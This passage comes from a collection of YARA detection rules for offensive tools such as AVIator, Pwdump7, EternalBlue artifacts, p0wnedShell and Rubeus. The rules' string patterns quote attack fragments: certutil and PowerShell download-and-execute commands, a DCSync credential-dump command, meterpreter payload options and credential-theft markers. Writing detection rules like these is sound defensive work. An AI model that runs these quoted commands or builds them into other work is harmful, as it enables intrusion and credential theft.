		$s3 = "Software\\NirSoft\\SniffPass" fullword ascii
		$s4 = "Sniffed PasswordsCFailed to start" wide
		$s5 = "Pwpcap.dll" fullword ascii
		$s6 = "nmwifi.exe" fullword ascii
		$s7 = "NmApi.dll" fullword ascii
		$s8 = "npptools.dll" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 4 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Avbypass_Aviator : FILE
{
	meta:
		description = "Detects AVIator, which is a backdoor generator utility, which uses cryptographic and injection techniques in order to bypass AV detection. This was observed to bypass Win.Trojan.AZorult. This rule works for binaries and memory."
		author = "ditekSHen"
		id = "2bddd64e-baca-58cb-ba52-27487cc4ded5"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L214-L240"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "1fb497eec2b0cd4051b5ddd53463f1da511c0a7b72d54a0bc68736a99fdc6143"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "msfvenom -p windows/meterpreter" ascii wide
		$s2 = "payloadBox.Text" ascii wide
		$s3 = "APCInjectionCheckBox" ascii wide
		$s4 = "Thread Hijacking (Shellcode Arch: x86, OS Arch: x86)" ascii wide
		$s5 = "injectExistingApp.Text" ascii wide
		$s6 = "Stable execution but can be traced by most AVs" ascii wide
		$s7 = "AV/\\tor" ascii wide
		$s8 = "AvIator.Properties.Resources" ascii wide
		$s9 = "Select injection technique" ascii wide
		$s10 = "threadHijacking_option" ascii wide
		$pwsh1 = "Convert.ToByte(Payload_Encrypted_Without_delimiterChar[" ascii wide
		$pwsh2 = "[DllImport(\"kernel32.dll\", SetLastError = true)]" ascii wide
		$pwsh3 = "IntPtr RtlAdjustPrivilege(" ascii wide
		$pwsh4 = /InjectShellcode\.(THREADENTRY32|CONTEXT64|WriteProcessMemory\(|CloseHandle\(|CONTEXT_FLAGS|CONTEXT\(\);|Thread32Next\()/ ascii wide
		$pwsh5 = "= Payload_Encrypted.Split(',');" ascii wide
		$pwsh6 = "namespace NativePayload_Reverse_tcp" ascii wide
		$pwsh7 = "byte[] Finall_Payload = Decrypt(KEY, _X_to_Bytes);" ascii wide
		$pwsh8 = /ConstantsAndExtCalls\.(WriteProcessMemory\(|CreateRemoteThread\()/ ascii wide

	condition:
		( uint16( 0 ) == 0x5a4d and ( 3 of ( $s* ) or 2 of ( $pwsh* ) ) ) or ( 3 of ( $s* ) or 2 of ( $pwsh* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Pwdump7 : FILE
{
	meta:
		description = "Detects Pwdump7 password Dumper"
		author = "ditekSHen"
		id = "dc6ff544-b9de-547b-9fa8-7d0b32e9592d"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L242-L254"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f84ab69ecc6837a826dc8726785165b8135edf51a47fb5bbaf19dc589b3032bd"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "savedump.dat" fullword ascii
		$s2 = "Asd -_- _RegEnumKey fail!" fullword ascii
		$s3 = "\\SAM\\" ascii
		$s4 = "Unable to dump file %S" fullword ascii
		$s5 = "NO PASSWORD" ascii

	condition:
		( uint16( 0 ) == 0x5a4d and 4 of them ) or ( all of them )
}
rule DITEKSHEN_INDICATOR_TOOL_LTM_Sharpexec : FILE
{
	meta:
		description = "Detects SharpExec lateral movement tool"
		author = "ditekSHen"
		id = "4373a052-9525-5b24-81a4-65cd68afcb6c"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L256-L275"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "17ae5c9f0b22e8ecbbbcbe052e466d00cb7b62cff423688b5138209c52f0698d"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "fileUploaded" fullword ascii
		$s2 = "$7fbad126-e21c-4c4e-a9f0-613fcf585a71" fullword ascii
		$s3 = "DESKTOP_HOOKCONTROL" fullword ascii
		$s4 = /WINSTA_(ACCESSCLIPBOARD|WINSTA_ALL_ACCESS)/ fullword ascii
		$s5 = /NETBIND(ADD|DISABLE|ENABLE|REMOVE)/ fullword ascii
		$s6 = /SERVICE_(ALL_ACCESS|WIN32_OWN_PROCESS|INTERROGATE)/ fullword ascii
		$s7 = /(Sharp|PS|smb)Exec/ fullword ascii
		$s8 = "lpszPassword" fullword ascii
		$s9 = "lpszDomain" fullword ascii
		$s10 = "wmiexec" fullword ascii
		$s11 = "\\C$\\__LegitFile" wide
		$s12 = "LOGON32_LOGON_NEW_CREDENTIALS" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d and 9 of them ) or ( all of them )
}
rule DITEKSHEN_INDICATOR_TOOL_PRV_Advancedrun : FILE
{
	meta:
		description = "Detects NirSoft AdvancedRun privialge escalation tool"
		author = "ditekSHen"
		id = "c886951a-7ee9-5d38-a724-3dbba8c6ec31"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L277-L289"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3f39e8f0629647f44a2f473d7b49a8b6adb1acd62de36420b80e7820e63854bb"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "RunAsProcessName" fullword wide
		$s2 = "Process ID/Name:" fullword wide
		$s3 = "swinsta.dll" fullword wide
		$s4 = "User of the selected process0Child of selected process (Using code injection) Specified user name and password" fullword wide
		$s5 = "\"Current User - Allow UAC Elevation$Current User - Without UAC Elevation#Administrator (Force UAC Elevation)" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and 3 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Amady : FILE
{
	meta:
		description = "Detects password stealer DLL. Dropped by Amadey"
		author = "ditekSHen"
		id = "6ee4e25b-bf38-5664-a08f-94e3fa92aa29"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L291-L306"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "409374bec5f58abeb7741b41f0fc7ea1c3fdc7bbc3f0c0628db0e3aac82836d1"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\AppData" fullword ascii
		$s2 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook" ascii
		$s3 = "\\Mikrotik\\Winbox\\Addresses.cdb" fullword ascii
		$s4 = "\\HostName" fullword ascii
		$s5 = "\\Password" fullword ascii
		$s6 = "SOFTWARE\\RealVNC\\" ascii
		$s7 = "SOFTWARE\\TightVNC\\" ascii
		$s8 = "cred.dll" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 400KB and 7 of them
}
rule DITEKSHEN_INDICATOR_TOOL_SCR_Amady : FILE
{
	meta:
		description = "Detects screenshot stealer DLL. Dropped by Amadey"
		author = "ditekSHen"
		id = "f7660899-ed12-5765-a856-6a1c7bbd8978"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L308-L320"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9e7ab39976e3219f0c6c3ce5341442343cc4baf30757cd1c9d0c2d3845fdda2f"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "User-Agent: Uploador" fullword ascii
		$s2 = "Content-Disposition: form-data; name=\"data\"; filename=\"" fullword ascii
		$s3 = "WebUpload" fullword ascii
		$s4 = "Cannot assign a %s to a %s%List does not allow duplicates ($0%x)%String" wide
		$s5 = "scr.dll" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 700KB and 4 of them
}
rule DITEKSHEN_INDICATOR_TOOL_EXP_Eternalblue : FILE
{
	meta:
		description = "Detects Windows executables containing EternalBlue explitation artifacts"
		author = "ditekSHen"
		id = "08173a1e-2e32-5add-864a-d92ffa0a3e44"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L322-L342"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "63e56637118accb8c32c20e52465c027df2dbf83b3b663d316b453ce879572c8"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$ci1 = "CNEFileIO_" ascii wide
		$ci2 = "coli_" ascii wide
		$ci3 = "mainWrapper" ascii wide
		$dp1 = "EXPLOIT_SHELLCODE" ascii wide
		$dp2 = "ETERNALBLUE_VALIDATE_BACKDOOR" ascii wide
		$dp3 = "ETERNALBLUE_DOUBLEPULSAR_PRESENT" ascii wide
		$dp4 = "//service[name='smb']/port" ascii wide
		$dp5 = /DOUBLEPULSAR_(PROTOCOL_|ARCHITECTURE_|FUNCTION_|DLL_|PROCESS_|COMMAND_|IS_64_BIT)/
		$cm1 = "--DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture x64 --Function Rundll" ascii wide
		$cm2 = "--DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll" ascii wide
		$cm3 = "--DaveProxyPort=0 --NetworkTimeout 30 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig" ascii wide

	condition:
		uint16( 0 ) == 0x5a4d and ( 2 of ( $ci* ) ) or ( 2 of ( $dp* ) ) or ( 1 of ( $dp* ) and 1 of ( $ci* ) ) or ( 1 of ( $cm* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_EXP_Weblogic : FILE
{
	meta:
		description = "Detects Windows executables containing Weblogic exploits commands"
		author = "ditekSHen"
		id = "e761a968-35cb-5284-99f2-6d516ad348e3"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L344-L353"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "01855f1125b0ba87dd40f7d460440dbda2d75c8b484e842a2b2e20c089b4ab5e"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "certutil.exe -urlcache -split -f AAAAA BBBBB & cmd.exe /c BBBBB" ascii
		$s2 = "powershell (new-object System.Net.WebClient).DownloadFile('AAAAA','BBBBB')" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 1 of them
}
rule DITEKSHEN_INDICATOR_TOOL_SCN_Smbtouch : FILE
{
	meta:
		description = "Detects SMBTouch scanner EternalBlue, EternalChampion, EternalRomance, EternalSynergy"
		author = "ditekSHen"
		id = "4e8176dd-4113-5fa8-a695-77e7169f6975"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L376-L400"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "78c2a435762d3febe927eb15910d5a18c1ffe74604673463543d3c859f5ef8e9"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "[+] SMB Touch started" fullword ascii
		$s2 = "[-] Could not connect to share (0x%08X - %s)" fullword ascii
		$s3 = "[!] Target could be either SP%d or SP%d," fullword ascii
		$s4 = "[!] for these SMB exploits they are equivalent" fullword ascii
		$s5 = "[+] Target is vulnerable to %d exploit%s" fullword ascii
		$s6 = "[+] Touch completed successfully" fullword ascii
		$s7 = "Network error while determining exploitability" fullword ascii
		$s8 = "Named pipe or share required for exploit" fullword ascii
		$w1 = "UsingNbt" fullword ascii
		$w2 = "TargetPort" fullword ascii
		$w3 = "TargetIp" fullword ascii
		$w4 = "RedirectedTargetPort" fullword ascii
		$w5 = "RedirectedTargetIp" fullword ascii
		$w6 = "NtlmHash" fullword ascii
		$w7 = "\\PIPE\\LANMAN" fullword ascii
		$w8 = "UserRejected: " fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 2 of ( $s* ) or all of ( $w* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_SCN_Nbtscan : FILE
{
	meta:
		description = "Detects NBTScan scanner for open NETBIOS nameservers on a local or remote TCP/IP network"
		author = "ditekSHen"
		id = "663c324e-4784-5efe-bbdf-60fa42e13944"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L402-L420"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a81b95ad60aac4d66586ae7dc61f6bcbe2b7185b66b2bb895f45abff3ad3f430"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "[%s] is an invalid target (bad IP/hostname)" fullword ascii
		$s2 = "ERROR: no parse for %s -- %s" fullword ascii
		$s3 = "add_target failed" fullword ascii
		$s4 = "   -p <n>    bind to UDP Port <n> (default=%d)" fullword ascii
		$s5 = "process_response.c" fullword ascii
		$s6 = "currTarget != 0" fullword ascii
		$s7 = "parse_target.c" fullword ascii
		$s8 = "dump_packet.c" fullword ascii
		$s9 = "parse_target_cb.c" fullword ascii
		$s10 = "DUMP OF PACKET" fullword ascii
		$s11 = "lookup_hostname.c" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 10 of ( $s* )
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Keychaindumper : FILE
{
	meta:
		description = "Detects macOS certificate/password keychain dumping tool"
		author = "ditekSHen"
		id = "cec094fa-c651-58a6-a306-f16d8603e536"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L473-L484"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f606bdd5dba2180ffc552c46373b52801a0bd65a538b381fb9f4240efc5bd458"
		score = 75
		quality = 71
		tags = "FILE"
		clamav_sig = "INDICATOR_Osx.Tool.PWS.KeychainDumper"

	strings:
		$s1 = "_getEmptyKeychainItemString" fullword ascii
		$s2 = "NdumpKeychainEntitlements" fullword ascii
		$s3 = "_dumpKeychainEntitlements" fullword ascii

	condition:
		( uint16( 0 ) == 0xfeca or uint16( 0 ) == 0xfacf ) and all of them
}
rule DITEKSHEN_INDICATOR_TOOL_PET_P0Wnedshell : FILE
{
	meta:
		description = "Detects compiled executables of p0wnedShell post-exploitation toolkit"
		author = "ditekSHen"
		id = "7df8f9b4-48d3-5271-9d60-5dd4bfaed316"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L486-L512"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9745b69573bf695fdada122143fb1889a7b2025250b5fb1e8f1a86b3be6f27d3"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Use WinRM, PsExec, SMB/WMI to execute commands on remote systems" wide
		$s2 = "-CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"" wide
		$s3 = "-Command '\"lsadump::dcsync /user:" wide
		$s4 = "-Payload windows/meterpreter/reverse_https -Lhost" wide
		$s5 = "Get-Content ./EncodedPayload.bat" fullword wide
		$e1 = "OnYNAB+LCAAAAAAABAC8vOeS60iSLvh75yly+rZZVxuqC4KQs3uvLQhFEJIACALoHVuD1oKQBMbuuy+Y4pw8dUTf3R+bZlWVZHh87uHh4vPItv63ZGrCMW+bF7GZ2zL+" wide
		$e2 = "kuIeAB+LCAAAAAAABADsvWt327iuMPw9v0Jv27Wa7DqJc2ma5nl71vZFTpzx/ZJL+3TlyLZiq7EtjyTHcffZ//0BSEqiKEqWbKczs8941qS2LgAIAiAIguDjfNp3DHOq" wide
		$e3 = "mZYIAB+LCAAAAAAABADsvflj2zyOMPx7/gptmnftbBIfuZp0t/OOfMZp7PjO0adfX9lSbCWy5Vp2HGfm+d8/ACQl6vCRNp2Z3bVmnioWSRAEQQAESfC/Pmwp8FTtmTFu" wide
		$e4 = "u9YGAB+LCAAAAAAABADsvW1D40ayKPw9v0Lr4V7ZE8vY5mUY9rKJBzMTnmWAgyGTvYTlCluAdmzJK9nDsEn++1NV/S61ZJmXZJIN52wG7O7q6urq6qrqquoXSfDveZgE" wide
		$e5 = "T3gDAB+LCAAAAAAABADtvX1f2zq2KPz3yafQzuZcwi5JEydQ2nM7v4cCnc0zQLmE7j3z6+7NmMQBnwY7YzsFTqff/WpJsi3Jki07DlA2mT008ctaS0tL601L0nThjSPX" wide
		$e6 = "zRgDAB+LCAAAAAAABADtfW1327jR6OdHv4Kr9TmWdiVZkl+SdZs913Gcrm9tx7WcbvekuS4t0TYbiVRJKYmfbf77xeCNeCVBinKcbNStI5HAYDAYDAaDwczNMhovwjjy" wide
		$e7 = "pxICAB+LCAAAAAAABADtvf17GkeyKPyz+Cvmlfw+ggRhfcXr1X1znsUIx5yVhC7IUbI+fnUHGKRZwww7M1jWyeZ/v1XV3z09wABysnviZ1cBpqe6urqquqq6uno8j4ZZ" wide
		$e8 = "H4sIAAAAAAAEANy9e3wTVfo4PG1SmkLbCdpgFdSgUeuCbLTAthYk005gQhNahUIVkCqIqKi1TaAuIGBaJRzG27Kuul5wV3fV1fUuUFxNKbTl3oJAuaiouE4paAGBFpB5" wide
		$k1 = "EasySystemPPID" fullword ascii
		$k2 = "EasySystemShell" fullword ascii
		$k3 = "LatMovement" fullword ascii
		$k4 = "ListenerURL" fullword ascii
		$k5 = "MeterStager" fullword ascii
		$k6 = "PatchEventLog" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 3 of ( $s* ) or 7 of ( $e* ) or all of ( $k* ) or ( 2 of ( $s* ) and 2 of ( $e* ) and 2 of ( $k* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Rubeus : FILE
{
	meta:
		description = "Detects Rubeus kerberos defensive/offensive toolset"
		author = "ditekSHen"
		id = "5af8cee0-e664-5dfe-9932-0e74ed41b6b4"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L514-L531"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ee817d23427970d7e77f9ce2a7cbc25c77177d81354fed83e7551cdcbc2d7cd2"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" fullword wide
		$s2 = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))" fullword wide
		$s3 = "rc4opsec" fullword wide
		$s4 = "pwdlastset" fullword wide
		$s5 = "LsaEnumerateLogonSessions" fullword ascii
		$s6 = "extractKerberoastHash" fullword ascii
		$s7 = "ComputeAllKerberosPasswordHashes" fullword ascii
		$s8 = "kerberoastDomain" fullword ascii
		$s9 = "GetUsernamePasswordTGT" fullword ascii
		$s10 = "WriteUserPasswordToFile" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 8 of them
}
rule DITEKSHEN_INDICATOR_TOOL_UAC_NSISUAC : FILE
{
	meta:
		description = "Detects NSIS UAC plugin"
		author = "ditekSHen"
		id = "4a7c20f6-bf0e-55fb-a0b9-7b51e4af7cd3"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L575-L587"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "48c0247c789328a0ff62816f5d6ecac7a0f2a3fe2cb95d99c0e7d988147f7137"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "HideCurrUserOpt" fullword wide
		$s2 = "/UAC:%X /NCRC%s" fullword wide
		$s3 = "2MyRunAsStrings" fullword wide
		$s4 = "CheckElevationEnabled" fullword ascii
		$s5 = "UAC.dll" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_INDICATOR_TOOL_REM_Intelliadmin : FILE
{
	meta:
		description = "Detects commerical IntelliAdmin remote tool"
		author = "ditekSHen"
		id = "15385e0b-ead4-5614-a04e-55878eb70b34"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L589-L602"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "8b601d68eff65bc6cc2fb46630a7021e229764f9a80f6d3278ba3b9f55e5b114"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$pdb1 = "\\Network Administrator" ascii
		$pdb2 = "\\Binaries\\Plugins\\Tools\\RPCService.pdb" ascii
		$s1 = "CIntelliAdminRPC" fullword wide
		$s2 = "IntelliAdmin RPC Service" fullword wide
		$s3 = "IntelliAdmin Remote Execute v" ascii
		$s4 = "IntelliAdminRPC" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( all of ( $pdb* ) or 2 of ( $s* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_PET_Sharpwmi : FILE
{
	meta:
		description = "Detects SharpWMI"
		author = "ditekSHen"
		id = "9c58d9fa-04b8-5a9c-8ae9-ff2e7530772f"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L604-L619"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e6c5764d0883e2882e06f07e4729362011a4d65614259b85978e1c6ef5cfadb7"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "scriptKillTimeout" fullword ascii
		$s2 = "RemoteWMIExecuteWithOutput" fullword ascii
		$s3 = "RemoteWMIFirewall" fullword ascii
		$s4 = "iex([char[]](@({0})|%{{$_-bxor{1}}}) -join '')" fullword wide
		$s5 = "\\\\{0}\\root\\subscription" fullword wide
		$s6 = "_Context##RANDOM##" fullword wide
		$s7 = "executevbs" fullword wide
		$s8 = "scriptb64" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and 4 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PET_Defendercontrol : FILE
{
	meta:
		description = "Detects Defender Control"
		author = "ditekSHen"
		id = "7bc1f26e-2432-5642-b1e7-c87683f7d932"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L621-L631"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "826ed0643a07580750eb11c4cf2c2759f53b6c2bda51705476edc4808abccbf8"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Windows Defender Control" wide
		$s2 = "www.sordum.org" wide ascii
		$s3 = "dControl" wide

	condition:
		uint16( 0 ) == 0x5a4d and 2 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PET_Mulit_Venomagent : FILE
{
	meta:
		description = "Detects Venom Proxy Agent"
		author = "ditekSHen"
		id = "598bc773-cbe9-503b-ba3e-27c2cde8910d"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L633-L645"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "5eda23a237404a44dc9eb057adbf6106166374168eb08e55c182da5c05ecb4f1"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "github.com/Dliv3/Venom/" ascii
		$s2 = "3HpKQVB3nT3qaNQPT-ZU/SKJ55ofz5TEmg5O3ROWA/CUs_-gfa04tGVO633Z4G/OSeEpRRb0Sq_5R6ArIi-" ascii
		$s3 = "venom_agent -" ascii
		$s4 = "bufferssh-userauthtransmitfileunknown portwirep: p->m= != sweepgen" ascii
		$s5 = "golang.org/x/crypto/ssh.(*handshakeTransport).readPacket"

	condition:
		( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x457f or uint16( 0 ) == 0xfacf ) and 3 of them
}
rule DITEKSHEN_INDICATOR_TOOL_HFS_Webserver : FILE
{
	meta:
		description = "Detects HFS Web Server"
		author = "ditekSHen"
		id = "2c9d9a38-8a6c-5c53-84bc-4eef77933172"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L647-L658"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f5b8947e3858466dae5f476790842500f8184c4676d8c0c4870adb7fd3206652"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "SOFTWARE\\Borland\\Delphi\\" ascii
		$s2 = "C:\\code\\mine\\hfs\\scriptLib.pas" fullword ascii
		$s3 = "hfs.*;*.htm*;descript.ion;*.comment;*.md5;*.corrupted;*.lnk" ascii
		$s4 = "Server: HFS" ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_INDICATOR_TOOL_PROX_Lanproxy : FILE
{
	meta:
		description = "Detects lanproxy-go-client"
		author = "ditekSHen"
		id = "71fc23d9-9aae-5666-832b-90cf5a86c474"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L660-L675"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "13a5aaea0fb522e3badb4a60d2db8d7dd46e5721bd6dc2e2b2e29d49e197c375"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "serverShare" fullword ascii
		$s2 = "parkingOnChan" fullword ascii
		$s3 = "{{join .Names \", \"}}{{\"\\t\"}}{{.Usage}}{{end}}{{end}}{{end}}{{end}}{{" ascii
		$s4 = "</table></thead></tbody>" fullword ascii
		$s5 = "value=aacute;abreve;addressagrave;alt -> andand;angmsd;angsph;any -> apacir;approx;articleatilde;barvee;barwed;bdoUxXvbecaus;ber" ascii
		$s6 = "/dev/urandom127.0.0.1:" ascii
		$s7 = "non-IPv4 addressnon-IPv6 addressntrianglelefteq;object is remotepacer: H_m_prev=reflect mismatchregexp: Compile(remote I/O error" ascii
		$s8 = ".WithDeadline(.in-addr.arpa." ascii

	condition:
		( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x457f ) and 6 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PET_Peirates : FILE
{
	meta:
		description = "Detects Kubernetes penetration tool Peirates"
		author = "ditekSHen"
		id = "74ce83ed-0d93-5cb0-97e8-6885ae83b336"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L677-L694"
